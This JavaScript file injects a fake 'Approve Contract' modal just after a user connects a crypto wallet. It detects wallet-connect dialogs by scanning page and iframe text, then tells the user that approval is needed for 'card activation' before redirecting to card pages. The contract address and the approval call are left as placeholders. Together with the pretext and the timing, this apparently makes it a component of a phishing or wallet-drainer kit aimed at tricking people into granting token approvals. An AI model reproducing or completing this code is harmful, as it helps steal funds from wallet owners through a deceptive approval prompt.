/**
 * Custom Contract Approval - Shows AFTER wallet connects
 *
 * Flow: User connects wallet (WalletConnect QR) → this modal appears → user approves → redirect to card page
 *
 * CONFIGURE: Set your contract address, ABI, and approval logic in CONFIG below.
 */
(function() {
  'use strict';

  const CONFIG = {
    contractAddress: '0xYOUR_CONTRACT_ADDRESS',
    chainId: 1,
    approvalMethod: 'approve',
    redirectDelayMs: 500,
  };

  let customModal = null;
  let shown = false;
  let lastConnectVisible = 0;

  function getRedirectUrl() {
    const stored = sessionStorage.getItem('tw-card-redirect');
    if (stored) return stored;
    if (window.location.pathname.includes('cards')) return window.location.pathname + window.location.search;
    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
    return '/cards-country-' + country + '.html';
  }

  function redirectToCard() {
    const url = getRedirectUrl();
    window.location.href = url.startsWith('/') ? window.location.origin + url : url;
  }

  function createCustomModal() {
    if (customModal) return customModal;

    const modal = document.createElement('div');
    modal.id = 'custom-contract-approval-modal';
    modal.innerHTML = `
      <div style="
        position: fixed; inset: 0; z-index: 9999999;
        display: flex; align-items: center; justify-content: center;
        background: rgba(0,0,0,0.6); padding: 16px;
      ">
        <div style="
          background: #0b0b0b; border-radius: 16px; padding: 24px;
          max-width: 420px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        ">
          <h2 style="color: #fff; font-size: 20px; margin: 0 0 8px;">Approve Contract</h2>
          <p style="color: #888; font-size: 14px; margin: 0 0 24px;">
            Please approve our contract to continue with card activation.
          </p>
          <button type="button" id="custom-modal-approve" style="
            width: 100%; padding: 14px 24px; background: #6366f1; color: #fff;
            border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
            cursor: pointer;
          ">Approve Contract</button>
          <button type="button" id="custom-modal-cancel" style="
            width: 100%; padding: 12px; background: transparent; color: #888;
            border: none; font-size: 14px; cursor: pointer; margin-top: 8px;
          ">Cancel</button>
        </div>
      </div>
    `;

    modal.style.display = 'none';
    document.body.appendChild(modal);
    customModal = modal;

    modal.querySelector('#custom-modal-approve').addEventListener('click', async function() {
      const btn = this;
      btn.disabled = true;
      btn.textContent = 'Approving...';
      try {
        // TODO: Add your contract approval logic (ethers.js, viem, web3.js)
        await new Promise(r => setTimeout(r, 1500));
        modal.style.display = 'none';
        window.dispatchEvent(new CustomEvent('custom-contract-approved'));
        setTimeout(redirectToCard, CONFIG.redirectDelayMs);
      } catch (err) {
        console.error('Contract approval failed:', err);
        btn.textContent = 'Approve Failed - Retry';
        btn.disabled = false;
      }
    });

    modal.querySelector('#custom-modal-cancel').addEventListener('click', () => {
      modal.style.display = 'none';
      shown = false;
    });

    return modal;
  }

  function getCombinedBodyText() {
    let text = (document.body?.textContent || '') + (document.body?.innerText || '');
    document.querySelectorAll('iframe').forEach(function(iframe) {
      try {
        const doc = iframe.contentDocument || iframe.contentWindow?.document;
        if (doc && doc.body) {
          text += (doc.body.textContent || '') + (doc.body.innerText || '');
        }
      } catch (_) {}
    });
    return text;
  }

  function isConnectModalVisible() {
    const bodyText = getCombinedBodyText();
    const connectPhrases = [
      'Connect a wallet', 'Connect your wallet', 'Scan with your wallet',
      'WalletConnect', 'MetaMask', 'Trust Wallet', 'Tap to open wallet'
    ];
    return connectPhrases.some(function(p) { return bodyText.includes(p); });
  }

  function maybeShowContractModal() {
    if (shown) return;
    if (isConnectModalVisible()) {
      lastConnectVisible = Date.now();
      return;
    }
    if (lastConnectVisible === 0) return;
    if (Date.now() - lastConnectVisible < 3000) return;
    if (Date.now() - lastConnectVisible > 60000) return;

    createCustomModal();
    customModal.style.display = 'block';
    shown = true;
  }

  window.addEventListener('tw:walletconnect-clicked', () => {
    lastConnectVisible = Date.now();
  });

  setInterval(() => {
    if (customModal && customModal.style.display === 'block') return;
    maybeShowContractModal();
  }, 800);

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      createCustomModal();
      setTimeout(maybeShowContractModal, 3000);
    });
  } else {
    createCustomModal();
    setTimeout(maybeShowContractModal, 3000);
  }
})();
